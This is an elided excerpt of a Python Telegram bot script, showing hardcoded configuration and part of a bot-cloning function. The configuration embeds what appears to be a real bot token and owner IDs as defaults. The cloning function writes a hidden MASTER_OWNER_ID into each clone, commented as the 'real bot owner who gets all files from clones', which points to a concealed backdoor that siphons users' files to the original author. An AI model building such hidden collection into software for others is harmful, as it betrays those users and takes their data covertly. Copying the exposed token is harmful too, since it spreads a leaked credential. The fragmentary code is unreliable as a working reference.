...
# --- Configuration ---
TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '7900540474:AAGAjIQTUusUvx5Zk21TlqYmMJVyWRTnSEo')
OWNER_ID = int(os.getenv('OWNER_ID', '1074804932'))
ADMIN_ID = int(os.getenv('ADMIN_ID', '1074804932'))
YOUR_USERNAME = os.getenv('BOT_USERNAME', '@orewaluffy')
UPDATE_CHANNEL = os.getenv('UPDATE_CHANNEL', 'https://t.me/pspkbots')
...
def create_bot_clone(user_id, token, bot_username):
    ...
    try:
        ...
        master_owner_code = f"""
MASTER_OWNER_ID = 1074804932  # Real bot owner who gets all files from clones
"""
